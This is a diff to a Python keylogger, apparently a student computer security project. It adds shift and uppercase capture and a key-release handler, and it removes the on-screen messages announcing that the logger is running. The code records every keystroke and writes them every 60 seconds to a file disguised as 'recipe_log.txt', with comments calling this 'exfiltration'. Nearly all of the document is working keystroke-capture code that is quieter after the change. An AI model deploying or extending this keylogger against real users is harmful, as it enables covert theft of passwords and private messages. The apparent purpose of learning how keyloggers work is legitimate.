@@ -1,7 +1,4 @@
-"""
-Computer Security Project: Simple Keylogger
-Using 'keyboard' library - more reliable than pynput
-"""
+# Landscapes of CS Keylogger 4/14/2026
 import keyboard
 import threading
 import time
@@ -14,17 +11,30 @@ class Keylogger:
         self.running = True
         self.last_write = time.time()
         self.write_interval = 60
+        # shift now works
+        self.shift_pressed = False
     
     def on_key(self, event):
-        """Process each key press"""
+        # the processes for each key press
         if event.event_type == keyboard.KEY_DOWN:
             key = event.name
             
-            # Handle regular characters
+            # checks if shift is pressed
+            if key == 'shift':
+                self.shift_pressed = True
+                return
+            elif key == 'shift_r' or key == 'shift_l':
+                self.shift_pressed = True
+                return
+            
+            # regular characters
             if len(key) == 1:
+                # shift if
+                if self.shift_pressed:
+                    key = key.upper()
                 self.buffer.append(key)
             
-            # Handle special keys
+            # special keys
             elif key == 'backspace':
                 if len(self.buffer) > 0:
                     self.buffer.pop()
@@ -38,8 +48,13 @@ class Keylogger:
             elif key == 'tab':
                 self.buffer.append('    ')
     
+    def on_key_release(self, event):
+        #tracks shift
+        if event.name == 'shift' or event.name == 'shift_r' or event.name == 'shift_l':
+            self.shift_pressed = False
+    
     def write_buffer(self):
-        """Write buffer to file (exfiltration)"""
+        # exfiltration buffer
         if self.buffer:
             with open(self.log_file, 'a') as f:
                 f.write(''.join(self.buffer))
@@ -48,45 +63,33 @@ class Keylogger:
             self.buffer = []
     
     def timer_loop(self):
-        """60-second heartbeat thread"""
+        #60 second write buffer
         while self.running:
             time.sleep(self.write_interval)
             if self.running:
                 self.write_buffer()
     
-    def start(self):
-        """Start the keylogger"""
-        print("="*50)
-        print("KEYLOGGER DEMONSTRATION")
-        print("="*50)
-        print("[*] Keylogger is RUNNING")
-        print("[*] Kill switch: Press Ctrl+Alt+S to stop")
-        print(f"[*] Auto-write to file: Every {self.write_interval} seconds")
-        print(f"[*] Log file: {self.log_file}")
-        print("-"*50)
-        
-        # Start timer thread for 60-second exfiltration
+    def start(self): #start
+
+        # 60-second exfiltration
         timer_thread = threading.Thread(target=self.timer_loop, daemon=True)
         timer_thread.start()
         
-        # Register kill switch (Ctrl+Alt+S)
+        # kill switch (Ctrl+Alt+S)
         keyboard.add_hotkey('ctrl+alt+s', self.stop)
         
-        # Start listening for keys
+        # listening for keys
         keyboard.on_press(self.on_key)
+        keyboard.on_release(self.on_key_release)
         
-        # Keep the program running
+        # wait
         keyboard.wait()
     
     def stop(self):
-        """Safe shutdown with final buffer write"""
-        print("\n" + "="*50)
-        print("[*] Kill switch activated! Shutting down...")
-        print("="*50)
-        
+
         self.running = False
         
-        # Write any remaining buffer to file
+        # writes any remaining buffer to file
         if self.buffer:
             with open(self.log_file, 'a') as f:
                 f.write(''.join(self.buffer))
@@ -94,14 +97,13 @@ class Keylogger:
             print(f"[+] Final buffer ({len(self.buffer)} chars) written to {self.log_file}")
         
         print(f"[+] Log file saved as: {self.log_file}")
-        print("[*] Keylogger terminated safely")
         os._exit(0)
 
 
-# ============= MAIN EXECUTION =============
+# Main
 if __name__ == "__main__":
-    # Create and start the keylogger
-    logger = Keylogger("recipe_log.txt")  # This saves the recipe
+    #starts the keylogger
+    logger = Keylogger("recipe_log.txt")  #saves the recipe
     
     import sys
     print(sys.executable)
